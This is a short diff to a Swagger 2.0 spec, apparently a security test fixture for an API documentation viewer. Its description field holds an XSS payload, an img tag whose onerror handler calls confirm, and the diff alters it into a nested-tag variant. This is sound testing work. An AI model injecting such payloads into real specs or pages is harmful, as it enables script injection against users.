@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: The attacker can fetch his own malicious swagger file
   description: |
-   Card name: <img src=1 x=<> onerror=[1].find(confirm); r=e>
+   Card name: <img <img src=1 x=<> onerror=[1].find(confirm); r=e>
 paths:
   /accounts:
     get:
